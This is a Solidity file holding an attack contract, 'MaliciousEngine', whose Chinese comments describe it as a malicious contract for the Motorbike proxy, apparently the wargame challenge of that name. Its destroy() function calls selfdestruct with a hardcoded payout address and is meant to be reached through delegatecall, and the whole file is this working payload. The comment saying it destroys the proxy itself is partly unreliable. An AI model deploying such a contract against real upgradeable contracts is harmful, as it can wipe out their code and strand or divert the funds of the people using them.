// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * 惡意合約：用於攻擊 Motorbike 代理合約
 * 這個合約包含一個自毀函數，可以通過 delegatecall 執行
 */
contract MaliciousEngine {
    /**
     * 自毀函數
     * 當通過 delegatecall 調用時，會銷毀代理合約（Motorbike）
     * 因為 delegatecall 會在調用者的存儲上下文中執行
     */
    function destroy() external {
        selfdestruct(payable(0xdb4101e7f5E2cC0e1A749092ff5287e3d36A5df6));
    }
}

